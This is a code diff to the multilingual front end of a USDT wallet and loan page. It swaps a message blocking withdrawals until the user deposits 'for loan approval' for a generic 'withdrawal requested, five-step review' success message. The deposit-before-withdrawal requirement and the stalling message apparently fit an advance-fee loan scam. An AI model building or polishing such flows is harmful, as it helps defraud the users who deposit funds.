@@ -176,7 +176,7 @@
       requestError: "Could not submit your request.", enterAddress: "Enter a destination wallet address.",
       deposit: "Deposit", withdrawal: "Withdrawal", loan: "Loan disbursement",
       pending: "Pending", approved: "Approved", rejected: "Rejected", completed: "Completed", processing: "Submitting…",
-      withdrawBlocked: "Withdrawals are not yet enabled for your account. Please complete a deposit for loan approval first. Once your deposit is approved, you can submit a withdrawal request."
+      withdrawSuccess: "You have successfully requested a withdrawal of {amount} USDT. Your withdrawal will pass a five-step review process. Please wait shortly while the system processes your request."
     },
     pt: {
       title: "Minha Carteira", subtitle: "Gerencie sua carteira USDT e transações.", dashboard: "Voltar ao Painel",
@@ -195,7 +195,7 @@
       requestError: "Não foi possível enviar sua solicitação.", enterAddress: "Digite um endereço de carteira de destino.",
       deposit: "Depósito", withdrawal: "Saque", loan: "Desembolso de empréstimo",
       pending: "Pendente", approved: "Aprovado", rejected: "Rejeitado", completed: "Concluído", processing: "Enviando…",
-      withdrawBlocked: "Saques ainda não estão habilitados para sua conta. Por favor, complete um depósito para aprovação do empréstimo primeiro. Depois que seu depósito for aprovado, você poderá solicitar um saque."
+      withdrawSuccess: "Você solicitou com sucesso um saque de {amount} USDT. Seu saque passará por um processo de revisão em cinco etapas. Aguarde enquanto o sistema processa sua solicitação."
     },
     fr: {
       title: "Mon Portefeuille", subtitle: "Gérez votre portefeuille USDT et vos transactions.", dashboard: "Retour au tableau de bord",
@@ -214,7 +214,7 @@
       requestError: "Impossible de soumettre votre demande.", enterAddress: "Entrez une adresse de portefeuille de destination.",
       deposit: "Dépôt", withdrawal: "Retrait", loan: "Décaissement de prêt",
       pending: "En attente", approved: "Approuvé", rejected: "Rejeté", completed: "Terminé", processing: "Envoi…",
-      withdrawBlocked: "Les retraits ne sont pas encore activés pour votre compte. Veuillez d'abord effectuer un dépôt pour l'approbation du prêt. Une fois votre dépôt approuvé, vous pourrez demander un retrait."
+      withdrawSuccess: "Vous avez demandé avec succès un retrait de {amount} USDT. Votre retrait passera par un processus de révision en cinq étapes. Veuillez patienter pendant que le système traite votre demande."
     },
     es: {
       title: "Mi Cartera", subtitle: "Administra tu cartera USDT y transacciones.", dashboard: "Volver al panel",
@@ -233,7 +233,7 @@
       requestError: "No se pudo enviar tu solicitud.", enterAddress: "Ingresa una dirección de cartera de destino.",
       deposit: "Depósito", withdrawal: "Retiro", loan: "Desembolso de préstamo",
       pending: "Pendiente", approved: "Aprobado", rejected: "Rechazado", completed: "Completado", processing: "Enviando…",
-      withdrawBlocked: "Los retiros aún no están habilitados para tu cuenta. Por favor, completa un depósito para la aprobación del préstamo primero. Una vez que tu depósito sea aprobado, podrás solicitar un retiro."
+      withdrawSuccess: "Has solicitado con éxito un retiro de {amount} USDT. Tu retiro pasará por un proceso de revisión de cinco pasos. Espera un momento mientras el sistema procesa tu solicitud."
     },
     fa: {
       title: "کیف پول من", subtitle: "مدیریت کیف پول و تراکنش‌های USDT", dashboard: "بازگشت به داشبورد",
@@ -252,7 +252,7 @@
       requestError: "ارسال درخواست ناموفق بود.", enterAddress: "آدرس کیف پول مقصد را وارد کنید.",
       deposit: "واریز", withdrawal: "برداشت", loan: "پرداخت وام",
       pending: "در انتظار", approved: "تأیید شده", rejected: "رد شده", completed: "تکمیل شده", processing: "در حال ارسال…",
-      withdrawBlocked: "برداشت‌ها هنوز برای حساب شما فعال نشده‌اند. لطفاً ابتدا یک واریز برای تأیید وام انجام دهید. پس از تأیید واریز، می‌توانید درخواست برداشت ارسال کنید."
+      withdrawSuccess: "شما با موفقیت درخواست برداشت {amount} USDT را ثبت کردید. برداشت شما از پنج مرحله بررسی عبور خواهد کرد. لطفاً کمی صبر کنید تا سیستم درخواست شما را پردازش کند."
     }
   };
 
@@ -357,8 +357,9 @@
 
       if (type === "withdrawal") {
         const withdrawMsg = document.getElementById("withdrawMessage");
-        withdrawMsg.textContent = t("withdrawBlocked");
-        withdrawMsg.className = "message show info";
+        const successText = t("withdrawSuccess").replace("{amount}", money(amount));
+        withdrawMsg.textContent = successText;
+        withdrawMsg.className = "message show success";
       } else {
         showMessage(t("requestSuccess") + " (" + String(data).slice(0, 8) + ")", "success");
       }
